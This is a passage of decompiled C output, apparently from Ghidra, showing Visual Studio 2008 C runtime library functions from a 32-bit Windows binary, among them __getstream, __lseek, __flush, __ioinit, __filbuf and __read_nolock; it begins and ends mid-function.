      return (FILE *)0x0;
    }
    _DAT_0042c1c8 = _DAT_0042c1c8 + 1;
    _File->_flag = local_8;
    _File->_cnt = 0;
    _File->_ptr = (char *)0x0;
    _File->_base = (char *)0x0;
    _File->_tmpfname = (char *)0x0;
    _File->_file = (int)_Mode;
    return _File;
  }
LAB_0041456a:
  piVar6 = __errno();
  *piVar6 = 0x16;
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return (FILE *)0x0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __getstream
// 
// Library: Visual Studio 2008 Release

FILE * __cdecl __getstream(void)

{
  int *piVar1;
  uint uVar2;
  int iVar3;
  void *pvVar4;
  BOOL BVar5;
  int iVar6;
  FILE *pFVar7;
  FILE *_File;
  
  pFVar7 = (FILE *)0x0;
  __lock(1);
  iVar6 = 0;
  do {
    _File = pFVar7;
    if (DAT_0042e8a0 <= iVar6) {
LAB_004148df:
      if (_File != (FILE *)0x0) {
        _File->_flag = _File->_flag & 0x8000;
        _File->_cnt = 0;
        _File->_base = (char *)0x0;
        _File->_ptr = (char *)0x0;
        _File->_tmpfname = (char *)0x0;
        _File->_file = -1;
      }
      FUN_00414910();
      return _File;
    }
    piVar1 = (int *)(DAT_0042d880 + iVar6 * 4);
    if (*piVar1 == 0) {
      iVar6 = iVar6 * 4;
      pvVar4 = __malloc_crt(0x38);
      *(void **)(iVar6 + DAT_0042d880) = pvVar4;
      if (*(int *)(DAT_0042d880 + iVar6) != 0) {
        BVar5 = ___crtInitCritSecAndSpinCount
                          ((LPCRITICAL_SECTION)(*(int *)(DAT_0042d880 + iVar6) + 0x20),4000);
        if (BVar5 == 0) {
          _free(*(void **)(iVar6 + DAT_0042d880));
          *(undefined4 *)(iVar6 + DAT_0042d880) = 0;
        }
        else {
          EnterCriticalSection((LPCRITICAL_SECTION)(*(int *)(iVar6 + DAT_0042d880) + 0x20));
          _File = *(FILE **)(iVar6 + DAT_0042d880);
          _File->_flag = 0;
        }
      }
      goto LAB_004148df;
    }
    uVar2 = *(uint *)(*piVar1 + 0xc);
    if (((uVar2 & 0x83) == 0) && ((uVar2 & 0x8000) == 0)) {
      if ((iVar6 - 3U < 0x11) && (iVar3 = __mtinitlocknum(iVar6 + 0x10), iVar3 == 0))
      goto LAB_004148df;
      __lock_file2(iVar6,*(void **)(DAT_0042d880 + iVar6 * 4));
      _File = *(FILE **)(DAT_0042d880 + iVar6 * 4);
      if ((*(byte *)&_File->_flag & 0x83) == 0) goto LAB_004148df;
      __unlock_file2(iVar6,_File);
    }
    iVar6 = iVar6 + 1;
  } while( true );
}



void FUN_00414910(void)

{
  FUN_00413064(1);
  return;
}



// Library Function - Single Match
//  __local_unwind4
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

void __cdecl __local_unwind4(uint *param_1,int param_2,uint param_3)

{
  undefined4 *puVar1;
  uint uVar2;
  undefined4 *unaff_FS_OFFSET;
  undefined4 uStack_28;
  undefined *puStack_24;
  uint local_20;
  uint uStack_1c;
  int iStack_18;
  uint *puStack_14;
  
  puStack_14 = param_1;
  iStack_18 = param_2;
  uStack_1c = param_3;
  puStack_24 = &LAB_004149ac;
  uStack_28 = *unaff_FS_OFFSET;
  local_20 = DAT_0042a044 ^ (uint)&uStack_28;
  *unaff_FS_OFFSET = &uStack_28;
  while( true ) {
    uVar2 = *(uint *)(param_2 + 0xc);
    if ((uVar2 == 0xfffffffe) || ((param_3 != 0xfffffffe && (uVar2 <= param_3)))) break;
    puVar1 = (undefined4 *)((*(uint *)(param_2 + 8) ^ *param_1) + 0x10 + uVar2 * 0xc);
    *(undefined4 *)(param_2 + 0xc) = *puVar1;
    if (puVar1[1] == 0) {
      __NLG_Notify(0x101);
      FUN_0041ad10();
    }
  }
  *unaff_FS_OFFSET = uStack_28;
  return;
}



void FUN_004149f2(int param_1)

{
  __local_unwind4(*(uint **)(param_1 + 0x28),*(int *)(param_1 + 0x18),*(uint *)(param_1 + 0x1c));
  return;
}



// Library Function - Single Match
//  @_EH4_CallFilterFunc@8
// 
// Library: Visual Studio 2008 Release

void __fastcall __EH4_CallFilterFunc_8(undefined *param_1)

{
  (*(code *)param_1)();
  return;
}



// Library Function - Single Match
//  @_EH4_TransferToHandler@8
// 
// Library: Visual Studio 2008 Release

void __fastcall __EH4_TransferToHandler_8(undefined *UNRECOVERED_JUMPTABLE)

{
  __NLG_Notify(1);
                    // WARNING: Could not recover jumptable at 0x00414a3c. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)UNRECOVERED_JUMPTABLE)();
  return;
}



// Library Function - Single Match
//  @_EH4_GlobalUnwind@4
// 
// Library: Visual Studio 2008 Release

void __fastcall __EH4_GlobalUnwind_4(PVOID param_1)

{
  RtlUnwind(param_1,(PVOID)0x414a53,(PEXCEPTION_RECORD)0x0,(PVOID)0x0);
  return;
}



// Library Function - Single Match
//  @_EH4_LocalUnwind@16
// 
// Library: Visual Studio 2008 Release

void __fastcall __EH4_LocalUnwind_16(int param_1,uint param_2,undefined4 param_3,uint *param_4)

{
  __local_unwind4(param_4,param_1,param_2);
  return;
}



// Library Function - Single Match
//  __lseek_nolock
// 
// Library: Visual Studio 2008 Release

long __cdecl __lseek_nolock(int _FileHandle,long _Offset,int _Origin)

{
  byte *pbVar1;
  HANDLE hFile;
  int *piVar2;
  DWORD DVar3;
  ulong uVar4;
  
  hFile = (HANDLE)__get_osfhandle(_FileHandle);
  if (hFile == (HANDLE)0xffffffff) {
    piVar2 = __errno();
    *piVar2 = 9;
    DVar3 = 0xffffffff;
  }
  else {
    DVar3 = SetFilePointer(hFile,_Offset,(PLONG)0x0,_Origin);
    if (DVar3 == 0xffffffff) {
      uVar4 = GetLastError();
    }
    else {
      uVar4 = 0;
    }
    if (uVar4 == 0) {
      pbVar1 = (byte *)((&DAT_0042d780)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40);
      *pbVar1 = *pbVar1 & 0xfd;
    }
    else {
      __dosmaperr(uVar4);
      DVar3 = 0xffffffff;
    }
  }
  return DVar3;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __lseek
// 
// Library: Visual Studio 2008 Release

long __cdecl __lseek(int _FileHandle,long _Offset,int _Origin)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  long local_20;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_0042d77c)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)((&DAT_0042d780)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_0042d780)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          local_20 = -1;
        }
        else {
          local_20 = __lseek_nolock(_FileHandle,_Offset,_Origin);
        }
        FUN_00414bb6();
        return local_20;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return -1;
}



void FUN_00414bb6(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __fileno
// 
// Library: Visual Studio 2008 Release

int __cdecl __fileno(FILE *_File)

{
  int *piVar1;
  int iVar2;
  
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    iVar2 = -1;
  }
  else {
    iVar2 = _File->_file;
  }
  return iVar2;
}



// Library Function - Single Match
//  __flush
// 
// Library: Visual Studio 2008 Release

int __cdecl __flush(FILE *_File)

{
  int _FileHandle;
  uint uVar1;
  int iVar2;
  uint uVar3;
  char *_Buf;
  
  iVar2 = 0;
  if ((((byte)_File->_flag & 3) == 2) && ((_File->_flag & 0x108U) != 0)) {
    _Buf = _File->_base;
    uVar3 = (int)_File->_ptr - (int)_Buf;
    if (0 < (int)uVar3) {
      uVar1 = uVar3;
      _FileHandle = __fileno(_File);
      uVar1 = __write(_FileHandle,_Buf,uVar1);
      if (uVar1 == uVar3) {
        if ((char)_File->_flag < '\0') {
          _File->_flag = _File->_flag & 0xfffffffd;
        }
      }
      else {
        _File->_flag = _File->_flag | 0x20;
        iVar2 = -1;
      }
    }
  }
  _File->_cnt = 0;
  _File->_ptr = _File->_base;
  return iVar2;
}



// Library Function - Single Match
//  __fflush_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __fflush_nolock(FILE *_File)

{
  int iVar1;
  
  if (_File == (FILE *)0x0) {
    iVar1 = _flsall(0);
  }
  else {
    iVar1 = __flush(_File);
    if (iVar1 == 0) {
      if ((_File->_flag & 0x4000U) == 0) {
        iVar1 = 0;
      }
      else {
        iVar1 = __fileno(_File);
        iVar1 = __commit(iVar1);
        iVar1 = -(uint)(iVar1 != 0);
      }
    }
    else {
      iVar1 = -1;
    }
  }
  return iVar1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _flsall
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl _flsall(int param_1)

{
  void **ppvVar1;
  void *_File;
  FILE *_File_00;
  int iVar2;
  int _Index;
  int local_28;
  int local_20;
  
  local_20 = 0;
  local_28 = 0;
  __lock(1);
  for (_Index = 0; _Index < DAT_0042e8a0; _Index = _Index + 1) {
    ppvVar1 = (void **)(DAT_0042d880 + _Index * 4);
    if ((*ppvVar1 != (void *)0x0) && (_File = *ppvVar1, (*(byte *)((int)_File + 0xc) & 0x83) != 0))
    {
      __lock_file2(_Index,_File);
      _File_00 = *(FILE **)(DAT_0042d880 + _Index * 4);
      if ((_File_00->_flag & 0x83U) != 0) {
        if (param_1 == 1) {
          iVar2 = __fflush_nolock(_File_00);
          if (iVar2 != -1) {
            local_20 = local_20 + 1;
          }
        }
        else if ((param_1 == 0) && ((_File_00->_flag & 2U) != 0)) {
          iVar2 = __fflush_nolock(_File_00);
          if (iVar2 == -1) {
            local_28 = -1;
          }
        }
      }
      FUN_00414d44();
    }
  }
  FUN_00414d73();
  if (param_1 != 1) {
    local_20 = local_28;
  }
  return local_20;
}



void FUN_00414d44(void)

{
  int unaff_ESI;
  
  __unlock_file2(unaff_ESI,*(void **)(DAT_0042d880 + unaff_ESI * 4));
  return;
}



void FUN_00414d73(void)

{
  FUN_00413064(1);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __ioinit
// 
// Library: Visual Studio 2008 Release

int __cdecl __ioinit(void)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  DWORD DVar3;
  BOOL BVar4;
  HANDLE pvVar5;
  UINT *pUVar6;
  int iVar7;
  HANDLE *ppvVar8;
  UINT UVar9;
  UINT UVar10;
  _STARTUPINFOA local_68;
  uint local_24;
  HANDLE *local_20;
  undefined4 uStack_c;
  undefined4 local_8;
  
  uStack_c = 0x414d91;
  local_8 = 0;
  GetStartupInfoA(&local_68);
  local_8 = 0xfffffffe;
  puVar2 = (undefined4 *)__calloc_crt(0x20,0x40);
  if (puVar2 == (undefined4 *)0x0) {
LAB_00414fd0:
    iVar7 = -1;
  }
  else {
    DAT_0042d77c = 0x20;
    DAT_0042d780 = puVar2;
    for (; puVar2 < DAT_0042d780 + 0x200; puVar2 = puVar2 + 0x10) {
      *(undefined *)(puVar2 + 1) = 0;
      *puVar2 = 0xffffffff;
      *(undefined *)((int)puVar2 + 5) = 10;
      puVar2[2] = 0;
      *(undefined *)(puVar2 + 9) = 0;
      *(undefined *)((int)puVar2 + 0x25) = 10;
      *(undefined *)((int)puVar2 + 0x26) = 10;
      puVar2[0xe] = 0;
      *(undefined *)(puVar2 + 0xd) = 0;
    }
    if ((local_68.cbReserved2 != 0) && ((UINT *)local_68.lpReserved2 != (UINT *)0x0)) {
      UVar9 = *(UINT *)local_68.lpReserved2;
      pUVar6 = (UINT *)((int)local_68.lpReserved2 + 4);
      local_20 = (HANDLE *)((int)pUVar6 + UVar9);
      if (0x7ff < (int)UVar9) {
        UVar9 = 0x800;
      }
      local_24 = 1;
      while ((UVar10 = UVar9, (int)DAT_0042d77c < (int)UVar9 &&
             (puVar2 = (undefined4 *)__calloc_crt(0x20,0x40), UVar10 = DAT_0042d77c,
             puVar2 != (undefined4 *)0x0))) {
        (&DAT_0042d780)[local_24] = puVar2;
        DAT_0042d77c = DAT_0042d77c + 0x20;
        puVar1 = puVar2;
        for (; puVar2 < puVar1 + 0x200; puVar2 = puVar2 + 0x10) {
          *(undefined *)(puVar2 + 1) = 0;
          *puVar2 = 0xffffffff;
          *(undefined *)((int)puVar2 + 5) = 10;
          puVar2[2] = 0;
          *(byte *)(puVar2 + 9) = *(byte *)(puVar2 + 9) & 0x80;
          *(undefined *)((int)puVar2 + 0x25) = 10;
          *(undefined *)((int)puVar2 + 0x26) = 10;
          puVar2[0xe] = 0;
          *(undefined *)(puVar2 + 0xd) = 0;
          puVar1 = (&DAT_0042d780)[local_24];
        }
        local_24 = local_24 + 1;
      }
      local_24 = 0;
      if (0 < (int)UVar10) {
        do {
          pvVar5 = *local_20;
          if ((((pvVar5 != (HANDLE)0xffffffff) && (pvVar5 != (HANDLE)0xfffffffe)) &&
              ((*(byte *)pUVar6 & 1) != 0)) &&
             (((*(byte *)pUVar6 & 8) != 0 || (DVar3 = GetFileType(pvVar5), DVar3 != 0)))) {
            ppvVar8 = (HANDLE *)
                      ((local_24 & 0x1f) * 0x40 + (int)(&DAT_0042d780)[(int)local_24 >> 5]);
            *ppvVar8 = *local_20;
            *(byte *)(ppvVar8 + 1) = *(byte *)pUVar6;
            BVar4 = ___crtInitCritSecAndSpinCount((LPCRITICAL_SECTION)(ppvVar8 + 3),4000);
            if (BVar4 == 0) goto LAB_00414fd0;
            ppvVar8[2] = (HANDLE)((int)ppvVar8[2] + 1);
          }
          local_24 = local_24 + 1;
          pUVar6 = (UINT *)((int)pUVar6 + 1);
          local_20 = local_20 + 1;
        } while ((int)local_24 < (int)UVar10);
      }
    }
    iVar7 = 0;
    do {
      ppvVar8 = (HANDLE *)(DAT_0042d780 + iVar7 * 0x10);
      if ((*ppvVar8 == (HANDLE)0xffffffff) || (*ppvVar8 == (HANDLE)0xfffffffe)) {
        *(undefined *)(ppvVar8 + 1) = 0x81;
        if (iVar7 == 0) {
          DVar3 = 0xfffffff6;
        }
        else {
          DVar3 = 0xfffffff5 - (iVar7 != 1);
        }
        pvVar5 = GetStdHandle(DVar3);
        if (((pvVar5 == (HANDLE)0xffffffff) || (pvVar5 == (HANDLE)0x0)) ||
           (DVar3 = GetFileType(pvVar5), DVar3 == 0)) {
          *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 0x40;
          *ppvVar8 = (HANDLE)0xfffffffe;
        }
        else {
          *ppvVar8 = pvVar5;
          if ((DVar3 & 0xff) == 2) {
            *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 0x40;
          }
          else if ((DVar3 & 0xff) == 3) {
            *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 8;
          }
          BVar4 = ___crtInitCritSecAndSpinCount((LPCRITICAL_SECTION)(ppvVar8 + 3),4000);
          if (BVar4 == 0) goto LAB_00414fd0;
          ppvVar8[2] = (HANDLE)((int)ppvVar8[2] + 1);
        }
      }
      else {
        *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 0x80;
      }
      iVar7 = iVar7 + 1;
    } while (iVar7 < 3);
    SetHandleCount(DAT_0042d77c);
    iVar7 = 0;
  }
  return iVar7;
}



// Library Function - Single Match
//  __filbuf
// 
// Library: Visual Studio 2008 Release

int __cdecl __filbuf(FILE *_File)

{
  byte bVar1;
  int *piVar2;
  int iVar3;
  uint uVar4;
  undefined *puVar5;
  char *_DstBuf;
  
  if (_File == (FILE *)0x0) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    uVar4 = _File->_flag;
    if (((uVar4 & 0x83) != 0) && ((uVar4 & 0x40) == 0)) {
      if ((uVar4 & 2) == 0) {
        _File->_flag = uVar4 | 1;
        if ((uVar4 & 0x10c) == 0) {
          __getbuf(_File);
        }
        else {
          _File->_ptr = _File->_base;
        }
        uVar4 = _File->_bufsiz;
        _DstBuf = _File->_base;
        iVar3 = __fileno(_File);
        iVar3 = __read(iVar3,_DstBuf,uVar4);
        _File->_cnt = iVar3;
        if ((iVar3 != 0) && (iVar3 != -1)) {
          if ((*(byte *)&_File->_flag & 0x82) == 0) {
            iVar3 = __fileno(_File);
            if ((iVar3 == -1) || (iVar3 = __fileno(_File), iVar3 == -2)) {
              puVar5 = &DAT_0042a648;
            }
            else {
              iVar3 = __fileno(_File);
              uVar4 = __fileno(_File);
              puVar5 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_0042d780)[iVar3 >> 5]);
            }
            if ((puVar5[4] & 0x82) == 0x82) {
              _File->_flag = _File->_flag | 0x2000;
            }
          }
          if (((_File->_bufsiz == 0x200) && ((_File->_flag & 8U) != 0)) &&
             ((_File->_flag & 0x400U) == 0)) {
            _File->_bufsiz = 0x1000;
          }
          _File->_cnt = _File->_cnt + -1;
          bVar1 = *_File->_ptr;
          _File->_ptr = _File->_ptr + 1;
          return (uint)bVar1;
        }
        _File->_flag = _File->_flag | (-(uint)(iVar3 != 0) & 0x10) + 0x10;
        _File->_cnt = 0;
      }
      else {
        _File->_flag = uVar4 | 0x20;
      }
    }
  }
  return -1;
}



// Library Function - Single Match
//  __read_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __read_nolock(int _FileHandle,void *_DstBuf,uint _MaxCharCount)

{
  byte *pbVar1;
  uint uVar2;
  byte bVar3;
  char cVar4;
  ulong *puVar5;
  int *piVar6;
  uint uVar7;
  short *psVar8;
  BOOL BVar9;
  DWORD DVar10;
  ulong uVar11;
  short *psVar12;
  int iVar13;
  int iVar14;
  int unaff_EDI;
  bool bVar15;
  longlong lVar16;
  short sVar17;
  uint local_1c;
  int local_18;
  short *local_14;
  short *local_10;
  undefined2 local_c;
  char local_6;
  char local_5;
  
  uVar2 = _MaxCharCount;
  local_18 = -2;
  if (_FileHandle == -2) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    piVar6 = __errno();
    *piVar6 = 9;
    return -1;
  }
  if ((_FileHandle < 0) || (DAT_0042d77c <= (uint)_FileHandle)) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    piVar6 = __errno();
    *piVar6 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    return -1;
  }
  piVar6 = &DAT_0042d780 + (_FileHandle >> 5);
  iVar14 = (_FileHandle & 0x1fU) * 0x40;
  bVar3 = *(byte *)(*piVar6 + iVar14 + 4);
  if ((bVar3 & 1) == 0) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    piVar6 = __errno();
    *piVar6 = 9;
    goto LAB_0041520e;
  }
  if (_MaxCharCount < 0x80000000) {
    local_14 = (short *)0x0;
    if ((_MaxCharCount == 0) || ((bVar3 & 2) != 0)) {
      return 0;
    }
    if (_DstBuf != (void *)0x0) {
      local_6 = (char)(*(char *)(*piVar6 + iVar14 + 0x24) * '\x02') >> 1;
      if (local_6 == '\x01') {
        if ((~_MaxCharCount & 1) == 0) goto LAB_004151fc;
        uVar7 = _MaxCharCount >> 1;
        _MaxCharCount = 4;
        if (3 < uVar7) {
          _MaxCharCount = uVar7;
        }
        local_10 = (short *)__malloc_crt(_MaxCharCount);
        if (local_10 == (short *)0x0) {
          piVar6 = __errno();
          *piVar6 = 0xc;
          puVar5 = ___doserrno();
          *puVar5 = 8;
          return -1;
        }
        lVar16 = __lseeki64_nolock(_FileHandle,0x100000000,unaff_EDI);
        iVar13 = *piVar6;
        *(int *)(iVar14 + 0x28 + iVar13) = (int)lVar16;
        *(int *)(iVar14 + 0x2c + iVar13) = (int)((ulonglong)lVar16 >> 0x20);
      }
      else {
        if (local_6 == '\x02') {
          if ((~_MaxCharCount & 1) == 0) goto LAB_004151fc;
          _MaxCharCount = _MaxCharCount & 0xfffffffe;
        }
        local_10 = (short *)_DstBuf;
      }
      psVar8 = local_10;
      uVar7 = _MaxCharCount;
      if ((((*(byte *)(*piVar6 + iVar14 + 4) & 0x48) != 0) &&
          (cVar4 = *(char *)(*piVar6 + iVar14 + 5), cVar4 != '\n')) && (_MaxCharCount != 0)) {
        *(char *)local_10 = cVar4;
        psVar8 = (short *)((int)local_10 + 1);
        uVar7 = _MaxCharCount - 1;
        local_14 = (short *)0x1;
        *(undefined *)(iVar14 + 5 + *piVar6) = 10;
        if (((local_6 != '\0') && (cVar4 = *(char *)(iVar14 + 0x25 + *piVar6), cVar4 != '\n')) &&
           (uVar7 != 0)) {
          *(char *)psVar8 = cVar4;
          psVar8 = local_10 + 1;
          uVar7 = _MaxCharCount - 2;
          local_14 = (short *)0x2;
          *(undefined *)(iVar14 + 0x25 + *piVar6) = 10;
          if (((local_6 == '\x01') && (cVar4 = *(char *)(iVar14 + 0x26 + *piVar6), cVar4 != '\n'))
             && (uVar7 != 0)) {
            *(char *)psVar8 = cVar4;
            psVar8 = (short *)((int)local_10 + 3);
            local_14 = (short *)0x3;
            *(undefined *)(iVar14 + 0x26 + *piVar6) = 10;
            uVar7 = _MaxCharCount - 3;
          }
        }
      }
      _MaxCharCount = uVar7;
      BVar9 = ReadFile(*(HANDLE *)(iVar14 + *piVar6),psVar8,_MaxCharCount,&local_1c,
                       (LPOVERLAPPED)0x0);
      if (((BVar9 == 0) || ((int)local_1c < 0)) || (_MaxCharCount < local_1c)) {
        uVar11 = GetLastError();
        if (uVar11 != 5) {
          if (uVar11 == 0x6d) {
            local_18 = 0;
            goto LAB_0041551b;
          }
          goto LAB_00415510;
        }
        piVar6 = __errno();
        *piVar6 = 9;
        puVar5 = ___doserrno();
        *puVar5 = 5;
      }
      else {
        local_14 = (short *)((int)local_14 + local_1c);
        pbVar1 = (byte *)(iVar14 + 4 + *piVar6);
        if ((*pbVar1 & 0x80) == 0) goto LAB_0041551b;
        if (local_6 == '\x02') {
          if ((local_1c == 0) || (*local_10 != 10)) {
            *pbVar1 = *pbVar1 & 0xfb;
          }
          else {
            *pbVar1 = *pbVar1 | 4;
          }
          local_14 = (short *)((int)local_14 + (int)local_10);
          _MaxCharCount = (uint)local_10;
          psVar8 = local_10;
          if (local_10 < local_14) {
            do {
              sVar17 = *(short *)_MaxCharCount;
              if (sVar17 == 0x1a) {
                pbVar1 = (byte *)(iVar14 + 4 + *piVar6);
                if ((*pbVar1 & 0x40) == 0) {
                  *pbVar1 = *pbVar1 | 2;
                }
                else {
                  *psVar8 = *(short *)_MaxCharCount;
                  psVar8 = psVar8 + 1;
                }
                break;
              }
              if (sVar17 == 0xd) {
                if (_MaxCharCount < local_14 + -1) {
                  if (*(short *)(_MaxCharCount + 2) == 10) {
                    uVar2 = _MaxCharCount + 4;
                    goto LAB_004155be;
                  }
LAB_00415651:
                  _MaxCharCount = _MaxCharCount + 2;
                  sVar17 = 0xd;
LAB_00415653:
                  *psVar8 = sVar17;
                }
                else {
                  uVar2 = _MaxCharCount + 2;
                  BVar9 = ReadFile(*(HANDLE *)(iVar14 + *piVar6),&local_c,2,&local_1c,
                                   (LPOVERLAPPED)0x0);
                  if (((BVar9 == 0) && (DVar10 = GetLastError(), DVar10 != 0)) || (local_1c == 0))
                  goto LAB_00415651;
                  if ((*(byte *)(iVar14 + 4 + *piVar6) & 0x48) == 0) {
                    if ((psVar8 == local_10) && (local_c == 10)) goto LAB_004155be;
                    __lseeki64_nolock(_FileHandle,0x1ffffffff,unaff_EDI);
                    if (local_c == 10) goto LAB_00415659;
                    goto LAB_00415651;
                  }
                  if (local_c == 10) {
LAB_004155be:
                    _MaxCharCount = uVar2;
                    sVar17 = 10;
                    goto LAB_00415653;
                  }
                  *psVar8 = 0xd;
                  *(undefined *)(iVar14 + 5 + *piVar6) = (undefined)local_c;
                  *(undefined *)(iVar14 + 0x25 + *piVar6) = local_c._1_1_;
                  *(undefined *)(iVar14 + 0x26 + *piVar6) = 10;
                  _MaxCharCount = uVar2;
                }
                psVar8 = psVar8 + 1;
                uVar2 = _MaxCharCount;
              }
              else {
                *psVar8 = sVar17;
                psVar8 = psVar8 + 1;
                uVar2 = _MaxCharCount + 2;
              }
LAB_00415659:
              _MaxCharCount = uVar2;
            } while (_MaxCharCount < local_14);
          }
          local_14 = (short *)((int)psVar8 - (int)local_10);
          goto LAB_0041551b;
        }
        if ((local_1c == 0) || (*(char *)local_10 != '\n')) {
          *pbVar1 = *pbVar1 & 0xfb;
        }
        else {
          *pbVar1 = *pbVar1 | 4;
        }
        local_14 = (short *)((int)local_14 + (int)local_10);
        _MaxCharCount = (uint)local_10;
        psVar8 = local_10;
        if (local_10 < local_14) {
          do {
            cVar4 = *(char *)_MaxCharCount;
            if (cVar4 == '\x1a') {
              pbVar1 = (byte *)(iVar14 + 4 + *piVar6);
              if ((*pbVar1 & 0x40) == 0) {
                *pbVar1 = *pbVar1 | 2;
              }
              else {
                *(undefined *)psVar8 = *(undefined *)_MaxCharCount;
                psVar8 = (short *)((int)psVar8 + 1);
              }
              break;
            }
            if (cVar4 == '\r') {
              if (_MaxCharCount < (undefined *)((int)local_14 + -1)) {
                if (*(char *)(_MaxCharCount + 1) == '\n') {
                  uVar7 = _MaxCharCount + 2;
                  goto LAB_0041539b;
                }
LAB_00415412:
                _MaxCharCount = _MaxCharCount + 1;
                *(undefined *)psVar8 = 0xd;
              }
              else {
                uVar7 = _MaxCharCount + 1;
                BVar9 = ReadFile(*(HANDLE *)(iVar14 + *piVar6),&local_5,1,&local_1c,
                                 (LPOVERLAPPED)0x0);
                if (((BVar9 == 0) && (DVar10 = GetLastError(), DVar10 != 0)) || (local_1c == 0))
                goto LAB_00415412;
                if ((*(byte *)(iVar14 + 4 + *piVar6) & 0x48) == 0) {
                  if ((psVar8 == local_10) && (local_5 == '\n')) goto LAB_0041539b;
                  __lseeki64_nolock(_FileHandle,0x1ffffffff,unaff_EDI);
                  if (local_5 == '\n') goto LAB_00415416;
                  goto LAB_00415412;
                }
                if (local_5 == '\n') {
LAB_0041539b:
                  _MaxCharCount = uVar7;
                  *(undefined *)psVar8 = 10;
                }
                else {
                  *(undefined *)psVar8 = 0xd;
                  *(char *)(iVar14 + 5 + *piVar6) = local_5;
                  _MaxCharCount = uVar7;
                }
              }
              psVar8 = (short *)((int)psVar8 + 1);
              uVar7 = _MaxCharCount;
            }
            else {
              *(char *)psVar8 = cVar4;
              psVar8 = (short *)((int)psVar8 + 1);
              uVar7 = _MaxCharCount + 1;
            }
LAB_00415416:
            _MaxCharCount = uVar7;
          } while (_MaxCharCount < local_14);
        }
        local_14 = (short *)((int)psVar8 - (int)local_10);
        if ((local_6 != '\x01') || (local_14 == (short *)0x0)) goto LAB_0041551b;
        bVar3 = *(byte *)(short *)((int)psVar8 + -1);
        if ((char)bVar3 < '\0') {
          iVar13 = 1;
          psVar8 = (short *)((int)psVar8 + -1);
          while ((((&DAT_0042a688)[bVar3] == '\0' && (iVar13 < 5)) && (local_10 <= psVar8))) {
            psVar8 = (short *)((int)psVar8 + -1);
            bVar3 = *(byte *)psVar8;
            iVar13 = iVar13 + 1;
          }
          if ((char)(&DAT_0042a688)[*(byte *)psVar8] == 0) {
            piVar6 = __errno();
            *piVar6 = 0x2a;
            goto LAB_00415517;
          }
          if ((char)(&DAT_0042a688)[*(byte *)psVar8] + 1 == iVar13) {
            psVar8 = (short *)((int)psVar8 + iVar13);
          }
          else if ((*(byte *)(*piVar6 + iVar14 + 4) & 0x48) == 0) {
            __lseeki64_nolock(_FileHandle,CONCAT44(1,-iVar13 >> 0x1f),unaff_EDI);
          }
          else {
            psVar12 = (short *)((int)psVar8 + 1);
            *(byte *)(*piVar6 + iVar14 + 5) = *(byte *)psVar8;
            if (1 < iVar13) {
              *(undefined *)(iVar14 + 0x25 + *piVar6) = *(undefined *)psVar12;
              psVar12 = psVar8 + 1;
            }
            if (iVar13 == 3) {
              *(undefined *)(iVar14 + 0x26 + *piVar6) = *(undefined *)psVar12;
              psVar12 = (short *)((int)psVar12 + 1);
            }
            psVar8 = (short *)((int)psVar12 - iVar13);
          }
        }
        iVar13 = (int)psVar8 - (int)local_10;
        local_14 = (short *)MultiByteToWideChar(0xfde9,0,(LPCSTR)local_10,iVar13,(LPWSTR)_DstBuf,
                                                uVar2 >> 1);
        if (local_14 != (short *)0x0) {
          bVar15 = local_14 != (short *)iVar13;
          local_14 = (short *)((int)local_14 * 2);
          *(uint *)(iVar14 + 0x30 + *piVar6) = (uint)bVar15;
          goto LAB_0041551b;
        }
        uVar11 = GetLastError();
LAB_00415510:
        __dosmaperr(uVar11);
      }
LAB_00415517:
      local_18 = -1;
LAB_0041551b:
